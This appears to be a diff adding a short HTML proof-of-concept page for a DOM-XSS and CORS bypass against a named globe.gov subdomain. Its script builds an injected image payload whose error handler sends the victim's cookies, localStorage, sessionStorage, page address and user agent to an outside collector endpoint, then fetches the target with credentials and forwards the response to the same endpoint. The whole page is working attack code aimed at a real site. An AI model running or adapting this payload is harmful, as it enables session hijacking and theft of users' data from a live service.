@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>PoC: DOM-XSS + CORS Bypass on globe.gov</h2>
+    <script>
+      const payload = `<img src=x onerror="fetch('https://eoat1elxcyeymir.m.pipedream.net',{
+        method: 'POST',
+        body: JSON.stringify({
+          cookies: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          location: location.href,
+          userAgent: navigator.userAgent
+        })
+      })">`;
+
+      const url = "https://datasearchdevnew.globe.gov/GLOBE/css/VISinterface.css/" + encodeURIComponent(payload);
+
+      fetch(url, {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(html => {
+        // Optional DOM-based execution if reflected
+        document.body.innerHTML += "<hr><h3>Response:</h3><pre>" + html.substring(0, 500) + "</pre>";
+        fetch("https://eoat1elxcyeymir.m.pipedream.net", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            proof: "Response fetched via CORS from globe.gov",
+            snippet: html.substring(0, 300)
+          })
+        });
+      });
+    </script>
+  </body>
+</html>
